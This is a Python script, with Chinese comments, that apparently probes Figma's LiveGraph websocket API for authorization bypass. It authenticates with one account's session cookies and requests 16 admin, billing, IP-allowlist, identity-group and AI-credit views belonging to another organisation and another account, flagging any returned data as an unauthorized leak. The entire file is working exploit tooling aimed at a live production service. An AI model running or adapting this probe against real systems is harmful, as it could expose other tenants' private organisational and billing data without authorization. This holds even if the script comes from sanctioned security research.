# -*- coding: utf-8 -*-
"""第四轮: org/plan 级 view 批量探测(B 身份 -> EXT_ORG / A_PLAN / A_TEAM)
目标: 找出校验模型不同的 resolver:
    - 返回数据(initial 非空) = 越权泄露 ⭐
    - 403 no_permission = org 管理员校验
    - 400 = 参数/业务条件
    - 空壳 = 资源级过滤
全部带 __requestId(静态 resolver 必需)
"""
import sys, json, io, asyncio, time, urllib.parse, uuid
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_TEAM = "1666382706663462213"
B_TEAM = "1667396394890946753"
A_PLAN = "cc6b6125-a07f-4d39-a54c-50ef65f33919"
B_PLAN = "46b1d26c-c802-4ef1-a83c-d96cfe7295f4"
EXT_ORG = "1484997479016537761"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    d = json.loads(urllib.parse.unquote(parts.get("__Host-figma.authn", "")))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        try:
            ne = json.loads(urllib.parse.unquote(parts["__Host-figma.embed"]))
            ne = {k: v for k, v in ne.items() if k == keep_uid}
            if ne:
                parts["__Host-figma.embed"] = urllib.parse.quote(json.dumps(ne, separators=(",", ":")))
            else:
                del parts["__Host-figma.embed"]
                parts.pop("__Host-figma.embed.mac", None)
        except Exception:
            pass
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_B = make_abs_pure(rawB, B_UID)

OUT = io.open("_ws_resolver_bypass_out4.txt", "w", encoding="utf-8")


def rid():
    return str(uuid.uuid4())


# (label, view, args) —— 全部 B 身份, 目标 = EXT_ORG / A 的资源
CASES = [
    ("AdminDashOrgInfo",     "AdminRequestDashOrgInfo",
     {"orgId": EXT_ORG, "__requestId": rid()}),
    ("CurrentOrgBilling",    "CurrentOrgBillingPeriodView",
     {"orgId": EXT_ORG, "__requestId": rid()}),
    ("EnterpriseOrgMeta",    "EnterpriseOrgMetaContentView",
     {"orgId": EXT_ORG, "__requestId": rid()}),
    ("NonEntOrgMeta",        "NonEnterpriseOrgMetaContentView",
     {"orgId": EXT_ORG, "__requestId": rid()}),
    ("OrgAdminSettingsPage", "OrgAdminSettingsPage",
     {"orgId": EXT_ORG, "__requestId": rid()}),
    ("IpAllowlistRanges",    "IpAllowlistRangesView",
     {"orgId": EXT_ORG, "__requestId": rid()}),
    ("ExtReqTable",          "ExtensionRequestTableView",
     {"orgId": EXT_ORG, "__requestId": rid()}),
    ("DomainOrgAdmins",      "DomainOrgAdminsToRemove",
     {"orgId": EXT_ORG, "domainIds": "", "__requestId": rid()}),
    ("IdpGroupsByOrg",       "IdpGroupsByOrg",
     {"planId": A_PLAN, "firstPageSize": 25, "queryString": "", "__requestId": rid()}),
    ("NpmPrivateRegistry",   "NpmPrivateRegistry",
     {"planId": A_PLAN, "__requestId": rid()}),
    ("McpConnectors",        "McpConnectorsView",
     {"planId": A_PLAN, "__requestId": rid()}),
    ("BillingTrial",         "BillingTrialForResource",
     {"resourceId": A_TEAM, "resourceType": "Team", "__requestId": rid()}),
    ("BillingTrialAndPlan",  "BillingTrialForResourceAndPlanType",
     {"resourceId": A_TEAM, "resourceType": "Team", "planType": "Org", "__requestId": rid()}),
    ("AiCreditsBeta",        "AiCreditsBetaContextView",
     {"planId": A_PLAN, "__requestId": rid()}),
    ("AiCreditsSeat",        "AiCreditsSeatContextView",
     {"planId": A_PLAN, "__requestId": rid()}),
    ("AiCreditsPerms",       "AiCreditsPermissionsView",
     {"planId": A_PLAN, "planParentId": A_TEAM, "planType": "Team", "PlanType": "Team",
      "__requestId": rid()}),
]


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def probe(label, view, args):
    frames = []
    try:
        async with websockets.connect(lg_url(A_MAKE, B_UID),
                                      additional_headers={"User-Agent": UA, "Cookie": ABS_B,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": B_UID, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{A_MAKE}"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": "0" * 32, "loadType": "initial",
                                      "args": args}))
            deadline = time.time() + 8
            while time.time() < deadline:
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    continue
                if isinstance(m, str):
                    frames.append(m)
                    if "viewLoaded" in m:
                        break
    except Exception as e:
        line = f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}"
        print(line)
        OUT.write(line + "\n")
        return
    # 摘要判定
    has_data = any('"initial":{' in f and '"initial":{}' not in f for f in frames)
    has_err = any("error" in f.lower() for f in frames)
    if has_data:
        tag = "⭐返回数据"
    elif has_err:
        tag = "⚠有错误"
    else:
        tag = "空壳"
    print(f"[{label}] {tag} 帧数={len(frames)}")
    OUT.write(f"\n===== [{label}] {view} {tag} 帧数={len(frames)} =====\n")
    for f in frames:
        OUT.write(f"  {f[:1500]}\n")
        if has_data:
            print(f"  🖼 {f[:800]}")
        elif "error" in f.lower():
            print(f"  ⚠ {f[:600]}")


async def main():
    print(f"第四轮: {len(CASES)} 个 org/plan 级 view, B 身份 -> EXT_ORG/A 资源")
    sem = asyncio.Semaphore(4)
    async def bounded(case):
        async with sem:
            await probe(*case)
    await asyncio.gather(*(bounded(c) for c in CASES))
    OUT.close()


asyncio.run(main())
